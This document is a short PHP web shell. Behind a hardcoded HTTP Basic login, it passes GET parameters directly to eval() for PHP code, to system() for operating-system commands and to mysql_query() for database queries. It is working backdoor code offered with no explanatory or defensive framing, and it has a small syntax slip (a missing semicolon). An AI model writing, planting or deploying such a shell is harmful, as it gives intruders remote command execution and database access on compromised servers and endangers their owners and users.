<?

$login		=	md5("user");    // login    in md5
$password	=	md5("pass"); 	// password in md5  

if (!isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_AUTH_USER'])!==$login || md5($_SERVER['PHP_AUTH_PW'])!==$password) {  
header('WWW-Authenticate: Basic realm="Authorization required!"');  
header('HTTP/1.0 401 Unauthorized');  
exit("Access Denied");}  
print_r("Access Granted<br>");  
echo "Got strings: php".$_GET['php'].";unix command shell:".$_GET['cmd'].";mysql query:".$_GET['mysql'].";<br><br>"
if(isset($_GET['php'])){
	echo $_GET['php'].":<br>";
	echo eval($_GET['php']);
}
if(isset($_GET['cmd'])){
	echo $_GET['cmd'].":<br>";
	echo system($_GET['cmd']);
}
if(isset($_GET['mysql'])){
	echo $_GET['mysql'].":<br>";
	echo mysql_query($_GET['mysql']);
}
?>

